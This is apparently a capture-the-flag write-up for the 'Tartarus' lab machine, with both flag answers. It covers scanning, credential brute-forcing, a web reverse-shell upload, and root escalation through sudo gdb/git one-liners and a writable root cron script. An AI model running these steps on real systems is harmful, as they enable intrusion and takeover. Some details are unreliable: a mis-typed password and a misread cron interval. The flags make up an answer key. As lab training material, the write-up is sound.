# Tartarus

export IP=10.10.1.16

## 1 - User flag

Lets start with an nmap scan to check what is running on what ports.

cmd: nmap -sC -sV -oN nmap/initial $IP

```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.128.84
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
|_  256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

Lets check ftp! <br>
One file as shown by the nmap.
```
vsftpd test file
```

The page only contains the apache default.<br>
lets issue a gobuster <br>

cmd: gobuster dir -u http://$IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 80 -x php,html,txt

```
/index.html (Status: 200)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
```

Checking robots.txt

```
User-Agent: *
Disallow : /admin-dir

I told d4rckh we should hide our things deep.
```

Potential user: d4rckh <br>

Lets check the $IP/admin-dir page

```
[TXT]	credentials.txt	2020-07-05 21:45 	760 	 
[TXT]	userid	2020-07-05 21:45 	78 	 
```

Well, a list of users and a list of passwords, lets brute force the SSH. <br>

cmd: hydra -L ./adminDir_files/userid -P ./adminDir_files/credentials.txt ssh://$IP:22

```
RESULTS: No password found
```

Lets check the FTP again...

```
dir
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt


ls -la
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ...
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
```

It was 2 nested folders to find a file

```
-rw-r--r--    1 ftp      ftp            14 Jul 05 21:45 yougotgoodeyes.txt
```

This file have a page path
```
/sUp3r-s3cr3t
```

Lets try to brute force it with the creds we found with burp since it redirects and hydra does not handle that. <br>

First found that the user was: enox <br>
This was possible because the error message was different <br>

Found the password: P@ssword1234<br>

Creds
```
enox:P@assword1234
```

After login, we can upload a file, lets first run gobuster in this directory<br>

cmd: gobuster dir -u http://$IP/sUp3r-s3cr3t -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt  -t 50 -x php,html,txt

```
/authenticate.php (Status: 200)
/home.php (Status: 302)
/images (Status: 301)
/index.html (Status: 200)
```

Lets upload a reverse shell... i'm in<br>

```
whoami
www-data

find / -type f -iname "*user*" -print 2>/dev/null

(...)
/home/d4rckh/user.txt
(...)

cat /home/d4rckh/user.txt
FLAG: 
```

### Answer: 0f7dbb2243e692e3ad222bc4eff8521f

## 2 - Root flag

Just to simple enumeration for privesc, just issued sudo -l

```
(thirtytwo) NOPASSWD: /var/www/gdb 
``

We can, possibly privesc to the account thirtytwo and from there to root . <br>

from gtfobins (to abuse gdb)

```
gdb -nx -ex '!sh' -ex quit
```

To run it as thirtytwo from www-data
```
sudo -u thirtytwo /var/www/gdb -nx -ex '!bash' -ex quit

whoami 
thirtytwo
```

Lets quick enumerate the same way for this new user (sudo -l)

```
User thirtytwo may run the following commands on ubuntu-xenial:
    (d4rckh) NOPASSWD: /usr/bin/git
```

From gtfobins (abuse git)
```
git help config
!/bin/bash

whoami
d4rckh
```

Now we need to escalate from this new user to root.<br>
at his home folder there is a python script which runs as root and is world readable, writable and executable <br>

Since this is world writable, lets modify it

```
"import os;import sys;os.system('cp /bin/bash /home/d4rckh/root; chmod +s /home/d4rckh/root');"
```

From the nature of the script, it seems a crontab script

```
cat /etc/crontab
*/2 *   * * *   root    python /home/d4rckh/cleanup.py
```

And it is, runs every 30 seconds (*/30 minutes)... just wait for the execution.. and yea, we got a suid bash generated by the script!<br>

just issue with -p to maintain privileges
```
./root -p

whoami 
root

cat /root/root.txt
FLAG:7e055812184a5fa5109d5db5c7eda7cd
```

### Answer: 7e055812184a5fa5109d5db5c7eda7cd